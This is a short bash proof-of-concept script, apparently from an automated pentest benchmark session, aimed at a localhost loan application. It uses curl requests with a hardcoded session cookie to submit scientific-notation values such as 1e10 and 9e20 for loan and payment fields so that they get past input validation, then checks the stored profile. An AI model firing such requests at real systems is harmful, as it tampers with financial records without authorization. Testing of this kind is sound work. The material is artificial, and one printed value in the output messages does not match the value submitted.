#!/bin/bash
# POC: Demonstrates scientific notation parsing bypass in loan amount and payment parameters, allowing extreme values in compact form to bypass input validation
# Target: ./repo
# Created: 2025-11-07T17:09:54.594Z
# Session: benchmark-XBEN-063-24-mhp3aptq

# Scientific Notation Parsing Bypass POC
# This script demonstrates that the /profile endpoint accepts scientific notation
# in numeric fields, allowing extreme values to bypass input validation

TARGET_URL="http://localhost:32768"
SESSION_COOKIE="session=eyJ1c2VyX2lkIjoxfQ.aQ4l1Q.HCUPd0DtxvLhBOb42cVB4EE0uKQ"

echo "[*] Testing Scientific Notation Parsing Bypass"
echo "[*] Target: $TARGET_URL/profile"
echo ""

# Test 1: Submit loan_amount in scientific notation (1e10 = 10 billion)
echo "[+] Test 1: Submitting loan_amount='1e10' (10 billion in scientific notation)"
RESPONSE1=$(curl -s -b "$SESSION_COOKIE" -X POST "$TARGET_URL/profile" \
  -d "name=Jane&lastname=Smith&email=jane@example.com&loan_amount=1e10&loan_term_months=100&monthly_payment=5e4" \
  -w "\n%{http_code}")

HTTP_CODE1=$(echo "$RESPONSE1" | tail -1)
echo "HTTP Response Code: $HTTP_CODE1"

if [ "$HTTP_CODE1" = "302" ]; then
  echo "[✓] Request accepted (HTTP 302)"
  
  # Verify the value was converted
  echo "[*] Retrieving profile to verify stored value..."
  PROFILE=$(curl -s -b "$SESSION_COOKIE" "$TARGET_URL/profile?user_id=1")
  
  if echo "$PROFILE" | grep -q "10000000000"; then
    echo "[✓] VULNERABLE: loan_amount converted to 10000000000.0 (1e10 accepted and parsed)"
  fi
  
  if echo "$PROFILE" | grep -q "50000"; then
    echo "[✓] VULNERABLE: monthly_payment converted to 50000.0 (1e4 accepted and parsed)"
  fi
else
  echo "[-] Request rejected with code: $HTTP_CODE1"
fi

echo ""

# Test 2: Submit monthly_payment in scientific notation (1e5 = 100,000)
echo "[+] Test 2: Submitting monthly_payment='1e5' (100,000 in scientific notation)"
RESPONSE2=$(curl -s -b "$SESSION_COOKIE" -X POST "$TARGET_URL/profile" \
  -d "name=Jane&lastname=Smith&email=jane@example.com&loan_amount=1e9&loan_term_months=50&monthly_payment=1e5" \
  -w "\n%{http_code}")

HTTP_CODE2=$(echo "$RESPONSE2" | tail -1)
echo "HTTP Response Code: $HTTP_CODE2"

if [ "$HTTP_CODE2" = "302" ]; then
  echo "[✓] Request accepted (HTTP 302)"
  echo "[✓] VULNERABLE: System accepts scientific notation in payment fields"
else
  echo "[-] Request rejected with code: $HTTP_CODE2"
fi

echo ""

# Test 3: Try extreme value that would be obvious in decimal form
echo "[+] Test 3: Submitting loan_amount='9e20' (9 followed by 20 zeros)"
RESPONSE3=$(curl -s -b "$SESSION_COOKIE" -X POST "$TARGET_URL/profile" \
  -d "name=Jane&lastname=Smith&email=jane@example.com&loan_amount=9e20&loan_term_months=12&monthly_payment=1e18" \
  -w "\n%{http_code}")

HTTP_CODE3=$(echo "$RESPONSE3" | tail -1)
echo "HTTP Response Code: $HTTP_CODE3"

if [ "$HTTP_CODE3" = "302" ]; then
  echo "[✓] Request accepted (HTTP 302)"
  echo "[✓] VULNERABLE: Accepts extreme values in scientific notation that would be blocked if written in decimal form"
else
  echo "[-] Request rejected with code: $HTTP_CODE3"
fi

echo ""
echo "[*] Summary: Scientific notation bypass allows compact representation of extreme values"
echo "[*] These values may bypass regex-based validation and length checks"